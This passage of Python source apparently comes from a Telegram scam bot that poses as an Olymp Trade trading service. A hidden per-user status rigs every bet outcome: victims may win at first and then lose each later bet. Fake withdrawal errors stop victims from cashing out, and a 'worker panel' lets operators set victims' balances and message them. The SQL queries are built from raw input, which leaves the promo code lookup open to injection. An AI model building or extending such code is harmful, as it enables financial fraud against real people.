		if message.text.isdigit():
			if len(message.text)>5 and len(message.text)<20:

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select status from users WHERE id = {message.chat.id}")
				pmst = cur.fetchone()[0]
				con.commit()

				if pmst == 1:
					bot.send_message(message.chat.id, "🛑 Ошибка вывода средств! Пожалуйста обратитесь в техническую поддержку бота @Olymp_Trade_Support 🛑",reply_markup=user())
				else:	


					if int(message.text) == fakeqiwi:

						

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select summ from payments WHERE id = {message.chat.id}")
						summpay = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"select balance from users WHERE id = {message.chat.id}")
						bn = cur.fetchone()[0]
						con.commit()

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"UPDATE users SET balance = {bn-summpay} where id = {message.chat.id}")
						con.commit()


						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"DELETE FROM payments WHERE id = {message.chat.id}")
						con.commit()

						bot.send_message(message.chat.id, "Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.",reply_markup=user())
						bot.register_next_step_handler(message, main_message)




					else:
						bot.send_message(message.chat.id, "Вывод средств возможен только на те реквизиты, с которых пополнялся баланс.")
						bot.register_next_step_handler(message, wallet)	

			else:
				bot.send_message(message.chat.id, "Неправильный номер,Введите еще раз.")
				bot.register_next_step_handler(message, wallet)	
		elif message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)
		else:
			bot.send_message(message.chat.id, "Напишите номер без +")
			bot.register_next_step_handler(message, wallet)	


	except Exception as e:
		raise
	
	


@bot.message_handler(content_types=['text'])
def stavka(message):
	try:
		if message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)
		else:
			activs = [activ1,activ2,activ3,activ4,activ5,activ6]	
			if message.text in activs:
				
				bot.send_message(message.chat.id, f"Вы выбрали {message.text}\nМинимальная сумма инвестиций - {minstavka}\n\nВаш баланс: {getbalance(message.chat.id)}",reply_markup=cancel())
				bot.register_next_step_handler(message, igra)
			else:
				bot.send_message(message.chat.id,"Неизвестная команда, воспользуйтесь меню")
				bot.register_next_step_handler(message, stavka)
					

			
	except Exception as e:
		raise
	
		

@bot.message_handler(content_types=['text'])
def igra(message):
	try:
		if message.text.isdigit():
			if int(message.text) >= minstavka:
				

				if int(message.text)<=getbalance(message.chat.id):
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"DELETE FROM stavka WHERE id = {message.chat.id}")
					con.commit()

					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"INSERT INTO stavka (id,summ) VALUES ({message.chat.id},{int(message.text)})")
					con.commit()
					bot.send_message(message.chat.id, f"Вам нужно угадать куда пойдет курс актива через 5 секнуд\n\nЕсли прогноз будет верным ваш выигрыш будет\nВверх - x2 от ставки\nНе изменится - x100 от ставки\nВниз - x2 от ставки",reply_markup=igrabtn())


					

					
					bot.register_next_step_handler(message, igraem)

				else:
					bot.send_message(message.chat.id, f"Недостаточно средств на балансе.\nДоступный баланс: {getbalance(message.chat.id)}")
					bot.register_next_step_handler(message, igra)


			else:
				bot.send_message(message.chat.id, f"Минимальная сумма депозита: {minstavka}")
				bot.register_next_step_handler(message, igra)
		
		elif message.text == otmena:
			bot.send_message(message.chat.id, "Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)		
		else:
			bot.send_message(message.chat.id, "Напишите число")
			bot.register_next_step_handler(message, igra)
			
	except Exception as e:
		raise
	


@bot.message_handler(content_types=['text'])
def igraem(message):
	try:
		statusi = [0,1,2]
		if (getstatus(message.chat.id) in statusi) is False:
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE users SET status = {0} where id = {message.chat.id}")
			con.commit()



		



		if getstatus(message.chat.id) == 0 and getbalance(message.chat.id) >= maxbalancestatus0:
			statusgame = 1

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE users SET status = {1} where id = {message.chat.id}")
			con.commit()
		elif getstatus(message.chat.id) == 2 and getbalance(message.chat.id) >= maxbalancestatus2:
			statusgame = 1

			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"UPDATE users SET status = {1} where id = {message.chat.id}")
			con.commit()	


		con = sqlite3.connect("data.db")
		cur = con.cursor()
		cur.execute(f"select summ from stavka WHERE id = {message.chat.id}")
		isumm = cur.fetchone()[0]
		con.commit()

		shtobudet = [verx,vniz,rovno]

		if message.text in shtobudet:
			if getstatus(message.chat.id) == 1 or (getstatus(message.chat.id) == 0 and message.text == rovno):


				

				bot.send_message(message.chat.id, f"Ставка сделана",reply_markup=rem)
				kudapoydet = bot.send_message(message.chat.id, f"Идёт рассчёт. . .")
				


				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE FROM process WHERE id = {message.chat.id}")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"INSERT INTO process (id,mid) VALUES ({message.chat.id},{kudapoydet.message_id})")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select mid from process where id = {message.chat.id}")
				kudapoydetid = cur.fetchone()[0]
				con.commit()
				
				if message.text == vniz:

					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"+{konec3}% 🟢"
					konec2 = f"Курс поднялся на {konec3}%"
					
				elif message.text == verx:
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"-{konec3}% 🔴"
					konec2 = f"Курс упал на {konec3}%"
				elif message.text == rovno:
					plusminus = ["+","-"]
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					verxvniz = [f"{choice(plusminus)}{konec3}% 🔴",f"+{konec3}% 🟢"]
					verxorvniz = ["Курс упал на ","Курс поднялся на "]
					
					konec = choice(verxvniz)
					konec2 = f"{choice(verxorvniz)}{konec3}%"
					
					
					 

				prcessi = [f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: {konec}"]

				def kuda():
					for xx in prcessi:
						bot.edit_message_text(chat_id=message.chat.id, message_id=kudapoydetid,text =xx)
						time.sleep(0.5)
					
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE users SET balance = {getbalance(message.chat.id)-isumm} where id = {message.chat.id}")
					con.commit()


					bot.send_message(message.chat.id,f"😔 Неверный прогноз 😔\n{konec2}\n\nЕсли хотите сыграть еще, введите сумму ставки\nДоступный баланс: {getbalance(message.chat.id)}",reply_markup=cancel())

					bot.register_next_step_handler(message, igra)


				t2 = threading.Thread(target=kuda)
				t2.start()



				

				


				
			elif getstatus(message.chat.id) == 0:
				if message.text == verx or message.text==vniz:
					x=1
				else:
					x=99

				

					

					
				

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE users SET balance = {getbalance(message.chat.id)+(isumm)*x} where id = {message.chat.id}")
				con.commit()

				bot.send_message(message.chat.id, f"Ставка сделана",reply_markup=rem)
				kudapoydet = bot.send_message(message.chat.id, f"Идёт рассчёт. . .")
				


				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE FROM process WHERE id = {message.chat.id}")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"INSERT INTO process (id,mid) VALUES ({message.chat.id},{kudapoydet.message_id})")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select mid from process where id = {message.chat.id}")
				kudapoydetid = cur.fetchone()[0]
				con.commit()
				
				if message.text == vniz:
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"-{konec3}% 🔴"
					konec2 = f"Курс упал на {konec3}%"
				elif message.text == verx:
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"+{konec3}% 🟢"
					konec2 = f"Курс поднялся на {konec3}%"
					 

				prcessi = [f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: {konec}"]

				def kuda():
					for xx in prcessi:
						bot.edit_message_text(chat_id=message.chat.id, message_id=kudapoydetid,text =xx)
						time.sleep(0.5)
					
					
					bot.send_message(message.chat.id,f"🤑 Ваш прогноз оказался верным 🤑\n{konec2}\n\nЕсли хотите сыграть еще, введите сумму ставки\nДоступный баланс: {getbalance(message.chat.id)}",reply_markup=cancel())

					bot.register_next_step_handler(message, igra)


				t2 = threading.Thread(target=kuda)
				t2.start()

			elif getstatus(message.chat.id) == 2:
				if message.text == verx or message.text==vniz:
					x=1
				else:
					x=99

				

					

					
				

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE users SET balance = {getbalance(message.chat.id)+(isumm)*x} where id = {message.chat.id}")
				con.commit()

				bot.send_message(message.chat.id, f"Ставка сделана",reply_markup=rem)
				kudapoydet = bot.send_message(message.chat.id, f"Идёт рассчёт. . .")
				


				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE FROM process WHERE id = {message.chat.id}")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"INSERT INTO process (id,mid) VALUES ({message.chat.id},{kudapoydet.message_id})")
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select mid from process where id = {message.chat.id}")
				kudapoydetid = cur.fetchone()[0]
				con.commit()
				
				if message.text == vniz:
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"-{konec3}% 🔴"
					konec2 = f"Курс упал на {konec3}%"
				elif message.text == verx:
					konec3 = f"{randint(0,1)}.{randint(0,30)}"
					konec = f"+{konec3}% 🟢"
					konec2 = f"Курс поднялся на {konec3}%"
				elif message.text == rovno:
					konec3 = f"{0}"
					konec = f"{konec3}% 🟡"
					konec2 = f"Курс не изменился"


					 

				prcessi = [f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: -{randint(0,1)}.{randint(0,30)}% 🔴",f"⌛️| Цена акции: +{randint(0,1)}.{randint(0,30)}% 🟢",f"⏳| Цена акции: {konec}"]

				def kuda():
					for xx in prcessi:
						bot.edit_message_text(chat_id=message.chat.id, message_id=kudapoydetid,text =xx)
						time.sleep(0.5)
					
					
					bot.send_message(message.chat.id,f"🤑 Ваш прогноз оказался верным 🤑\n{konec2}\n\nЕсли хотите сыграть еще, введите сумму ставки\nДоступный баланс: {getbalance(message.chat.id)}",reply_markup=cancel())

					bot.register_next_step_handler(message, igra)


				t2 = threading.Thread(target=kuda)
				t2.start()	


				

				

				


					

				

		
		else:
			bot.send_message(message.chat.id,"Неизвестная команда, воспользуйтесь меню")
			bot.register_next_step_handler(message, igraem)
			
	except Exception as e:
		raise
	


@bot.message_handler(content_types=['text'])
def replaceprocent(message):
	try:
		if message.chat.id in admins:
			if message.text == "Отмена":
				bot.send_message(message.chat.id,f"Отменено",reply_markup=rem)
				bot.send_message(message.chat.id,f"Админ панель⚙️",reply_markup=adminpanel())
				bot.register_next_step_handler(message, main_message)
			else:
				if message.text.isdigit():
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"UPDATE procent SET p = {int(message.text)}")
					con.commit()

					

					bot.send_message(message.chat.id,f"Данные изменены",reply_markup=rem)
					bot.send_message(message.chat.id,f"Админ панель⚙️",reply_markup=adminpanel())
					bot.register_next_step_handler(message, main_message)

				else:
					bot.send_message(message.chat.id,f"Напишите число")
					bot.register_next_step_handler(message, replaceprocent)
				
	except Exception as e:
		raise




@bot.message_handler(content_types=['text'])
def mamontmessage(message):

	
	try:

		if ":" in message.text:

			m = message.text.split(":")

			if m[0].isdigit():
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select count(*) from users where id = {m[0]}")
				est = cur.fetchone()[0]
				con.commit()
				if est == 0:
					bot.send_message(message.chat.id,f"Пользователь не найден в базе")
					bot.register_next_step_handler(message, mamontmessage)
				else:	


					bot.send_message(m[0],m[1])
					bot.send_message(message.chat.id,f"Сообщение отправлено",reply_markup=rem)
					bot.send_message(message.chat.id,f"🐵 Воркер панель",reply_markup=workerpanel())
					bot.register_next_step_handler(message, main_message)
			else:
				bot.send_message(message.chat.id,f"Неправильный формат данных")
				bot.register_next_step_handler(message, mamontmessage)
		elif message.text == "Отмена":
			bot.send_message(message.from_user.id, "Рассылка отменена",reply_markup=rem)
			bot.send_message(message.from_user.id, "Воркер панель⚙️",reply_markup=workerpanel())
			bot.register_next_step_handler(message, main_message)
					
		else:
			bot.send_message(message.chat.id,f"Неправильный формат данных")
			bot.register_next_step_handler(message, mamontmessage)
			
	except Exception as e:
		raise
	
	
@bot.message_handler(content_types=['text'])
def rassmamontmessage(message):
	
	
	try:
		if message.text == "Отмена":
			bot.send_message(message.from_user.id, "Рассылка отменена",reply_markup=rem)
			bot.send_message(message.from_user.id, "Воркер панель⚙️",reply_markup=workerpanel())
			bot.register_next_step_handler(message, main_message)

		else:	
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			bot.send_message(message.from_user.id, "✅ Рассылка успешно начата",reply_markup=rem)
			bot.send_message(message.from_user.id, "Воркер панель⚙️",reply_markup=workerpanel())
			cur.execute(f"SELECT id FROM users where boss = {message.chat.id}")
			id = cur.fetchall()
			def rassmamontw():

				for i in id:
					try:
						bot.send_message(i[0], f"{message.text}")
						time.sleep(0.1)
					except:
						pass
				bot.send_message(message.from_user.id, "✅ Рассылка успешно завершена")		
			t3 = threading.Thread(target=rassmamontw)
			t3.start()			
			
			bot.register_next_step_handler(message, main_message)
	except Exception as e:
		raise

@bot.message_handler(content_types=['text'])
def promo(message):

	try:
		testpromo = message.text
		if testpromo == otmena:
			bot.send_message(message.chat.id,"Отменено",reply_markup=user())
			bot.register_next_step_handler(message, main_message)

		else:
			
		
			con = sqlite3.connect("data.db")
			cur = con.cursor()
			cur.execute(f"select count(*) from promocode where code = \'{testpromo}\'")
			
			r = cur.fetchone()[0]

			con.commit()
			
			if r == 0:
				
				
				bot.send_message(message.chat.id,"❗️ Промокод неправильный или уже использовался")
				bot.register_next_step_handler(message, promo)
			else:
				
				
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"select summa from promocode where code = \'{testpromo}\'")
				summpromo = cur.fetchone()[0]
				con.commit()

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"DELETE  from promocode where code = \'{testpromo}\'")
				con.commit()

				

				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"UPDATE users SET balance = {getbalance(message.chat.id)+summpromo} WHERE id = {message.chat.id}")
				con.commit()



				bot.send_message(message.chat.id,f"♻️ Ваш баланс пополнен на {summpromo} RUB\n\n💰 Баланс {getbalance(message.chat.id)+summpromo} RUB",reply_markup=user())
				bot.register_next_step_handler(message, main_message)



	except Exception as e:
		pass



@bot.message_handler(content_types=['text'])
def create_promo(message):

	try:
		if message.text.isdigit():
			summ = int(message.text)
			if summ>maxpromo:
				bot.send_message(message.chat.id,f"Максимальная сумма промокода {maxpromo}")
				bot.register_next_step_handler(message, create_promo)
			elif summ<=0:
				bot.send_message(message.chat.id,f"Сумма должна быть больше 0")
				bot.register_next_step_handler(message, create_promo)
			else:
				letters = string.ascii_letters
				codecode = ( ''.join(random.choice(letters) for i in range(10)) )
				con = sqlite3.connect("data.db")
				cur = con.cursor()
				cur.execute(f"INSERT INTO promocode (summa,code)"
							f"VALUES ({summ},\'{codecode}\')")
				con.commit()
				bot.send_message(message.chat.id,f"🤑 Ваш промокод: `{codecode}`",parse_mode='Markdown')
				bot.register_next_step_handler(message, main_message)


		else:
			bot.send_message(message.chat.id,"Введите число")

	except Exception as e:
		pass




@bot.message_handler(content_types=['text'])
def workstatus(message):

	
	try:

		if ":" in message.text:

			m = message.text.split(":")

			if m[0].isdigit() and m[1].isdigit():
				if int(m[1])==1 or int(m[1])==0 or int(m[1])==2:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select count(*) from users where id = {m[0]}")
					est = cur.fetchone()[0]
					con.commit()
					if est == 0:
						bot.send_message(message.chat.id,f"Пользователь не найден в базе")
						bot.register_next_step_handler(message, workstatus)
					else:

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"UPDATE users SET status = {int(m[1])} WHERE id = {int(m[0])}")
						con.commit()	


						
						bot.send_message(message.chat.id,f"Готово !",reply_markup=rem)
						bot.send_message(message.chat.id,f"🐵 Воркер панель",reply_markup=workerpanel())
						bot.register_next_step_handler(message, main_message)

				else:
					bot.send_message(message.chat.id,f"Можно ставить статус 0,1 или 2")
					bot.register_next_step_handler(message, workstatus)		
			else:
				bot.send_message(message.chat.id,f"Неправильный формат данных")
				bot.register_next_step_handler(message, workstatus)
		elif message.text == "Отмена":
			bot.send_message(message.from_user.id, "Отменено",reply_markup=rem)
			bot.send_message(message.from_user.id, "Воркер панель⚙️",reply_markup=workerpanel())
			bot.register_next_step_handler(message, main_message)
					
		else:
			bot.send_message(message.chat.id,f"Неправильный формат данных")
			bot.register_next_step_handler(message, workstatus)
			
	except Exception as e:
		raise


@bot.message_handler(content_types=['text'])
def dobavleniebalance(message):

	
	try:

		if ":" in message.text:

			m = message.text.split(":")

			if m[0].isdigit() and m[1].isdigit():
				if int(m[1])>=0:
					con = sqlite3.connect("data.db")
					cur = con.cursor()
					cur.execute(f"select count(*) from users where id = {m[0]}")
					est = cur.fetchone()[0]
					con.commit()
					if est == 0:
						bot.send_message(message.chat.id,f"Пользователь не найден в базе")
						bot.register_next_step_handler(message, dobavleniebalance)
					else:

						con = sqlite3.connect("data.db")
						cur = con.cursor()
						cur.execute(f"UPDATE users SET balance = {int(m[1])} WHERE id = {int(m[0])}")
						con.commit()	


						
						bot.send_message(message.chat.id,f"Готово !",reply_markup=rem)
						bot.send_message(message.chat.id,f"🐵 Воркер панель",reply_markup=workerpanel())
						bot.register_next_step_handler(message, main_message)

				else:
					bot.send_message(message.chat.id,f"Баланс должен быть больше 0")
					bot.register_next_step_handler(message, dobavleniebalance)		
			else:
				bot.send_message(message.chat.id,f"Неправильный формат данных")
				bot.register_next_step_handler(message, dobavleniebalance)
		elif message.text == "Отмена":
			bot.send_message(message.from_user.id, "Отменено",reply_markup=rem)
			bot.send_message(message.from_user.id, "Воркер панель⚙️",reply_markup=workerpanel())
			bot.register_next_step_handler(message, main_message)
					
		else:
			bot.send_message(message.chat.id,f"Неправильный формат данных")
			bot.register_next_step_handler(message, dobavleniebalance)
			
	except Exception as e:
		raise	

if __name__ == '__main__':
	bot.polling(none_stop=True)